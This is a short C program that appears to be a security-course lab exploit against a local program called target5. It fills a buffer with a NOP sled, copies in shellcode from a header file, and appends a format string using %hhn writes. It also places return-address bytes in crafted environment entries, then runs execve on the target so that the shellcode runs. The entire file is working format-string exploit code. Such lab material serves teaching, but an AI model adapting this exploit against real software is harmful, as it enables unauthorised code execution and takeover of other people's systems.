#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define BUF_SIZE 256
#define NOP 0x90
// Ret Addr 0x3021f988
// formatString[0] 0x3021f9a0
// formatString[60] 0x3021f9dc
// Shellcode

int main(void) {
    char *args[3];
    char *env[21];
    char *ptr;
    char buff[BUF_SIZE];
    char formatStr[] = "%08x%08x%08x%08x%143x%hhn%29x%hhn%40x%hhn%15x%hhn";
    int i;

    ptr = &buff[60];
    for (i = 0; i < BUF_SIZE; i++)
        buff[i] = NOP;
    for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];
    for (i = 0; i < strlen(formatStr); i++)
        *(ptr++) = formatStr[i];
    buff[BUF_SIZE - 1] = '\0';

    char retAddr[] = "\x88\xf9\x21\x30";

    args[0] = TARGET;
    args[1] = retAddr;
    args[2] = NULL;

    env[0] = "\x00";
    env[1] = "\x00";
    env[2] = "\x00";
    env[3] = "aaaaaaa";
    env[4] = "\x89\xf9\x21\x30";
    env[5] = "\x00";
    env[6] = "\x00";
    env[7] = "\x00";
    env[8] = "aaaaaaa";
    env[9] = "\x8a\xf9\x21\x30";
    env[10] = "\x00";
    env[11] = "\x00";
    env[12] = "\x00";
    env[13] = "aaaaaaa";
    env[14] = "\x8b\xf9\x21\x30";
    env[15] = "\x00";
    env[16] = "\x00";
    env[17] = "\x00";
    env[18] = "aaa";
    env[19] = &buff[60];
    env[20] = NULL;

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
